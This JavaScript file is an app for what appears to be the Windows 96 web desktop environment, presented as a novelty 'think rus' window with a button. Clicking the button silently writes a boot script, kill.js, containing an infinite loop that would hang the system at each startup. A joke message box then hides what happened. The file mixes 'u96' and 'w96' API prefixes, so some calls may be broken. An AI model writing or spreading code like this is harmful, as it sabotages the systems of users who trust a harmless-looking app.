function main(argv) {
  const wnd = u96.ui.wnd({
    title: "think rus",
    html: `
			<h1>think rus</h1>
			<br>
			<div class="w96-panel">
				you can think rus. simply click on this
				<button class="w96-button btn">button</button>.
			</div>
		`,
  });

  const body = wnd.getBodyContainer();
  body.querySelector(".btn").onclick = async function () {
    await w96.FS.writestr("c:/system/boot/kill.js", "while (true) {document.write('');};");
    w96.ui.MsgBoxSimple.info("simple and easy", "just think you are a russian guy", "OK");
  };

  wnd.show();
}

// Register app

/*
 Arg 1: App name
 Arg 2: File associations
 Arg 3: Main function
*/
registerApp("thinkrus", [], main);

// To find out what icons you can use, go to W:/system/resource/themes/default/icons and pick an icon name from there.
// There is currently a bug where external icons do not load at all.
const icon = "tips";

u96.shell.mkShortcut(
  "c:/system/programs/WTF/thinkrus.link",
  icon,
  "thinkrus"
);